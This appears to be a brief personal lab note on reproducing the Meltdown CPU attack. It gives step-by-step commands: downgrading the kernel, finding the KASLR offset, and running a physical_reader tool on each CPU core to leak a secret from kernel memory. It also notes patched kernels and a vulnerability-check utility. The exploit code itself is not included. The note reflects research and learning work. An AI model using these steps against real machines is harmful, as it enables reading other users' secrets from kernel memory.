able to run meltdown 


1. change kernel to 4.10

2.could not stop the kaslr so , i used ./kaslr command to find the kernel offest 
3. in the rest of the commands i used this offset value for everything 


4. reliablity is aroud 99.92%


5 reading secreting 


run sudo ./secret 


and in the  second terminal taskset 0x01 ./physical_reader 0x2011a6870  0xffff8c9700000000

if it does not work then apply 


taskset 0x02 ./physical_reader 0x2011a6870  0xffff8c9700000000


if does not give the output repeat with


taskset 0x03 ./physical_reader 0x2011a6870  0xffff8c9700000000


and so on and repeat for all the cores and on one of the cores you will get the ouput


futture research:


in kernel 4.15 they patch the kernel against the meltdown attack need to find how they avoid the meltdown.


i have found a utitily to find if my kernel is  meltdown vulnerable or not 


run the utility from "meltdown_vulnerable _assement tool" folder 



it will give you if your kernel is vulnerable for not
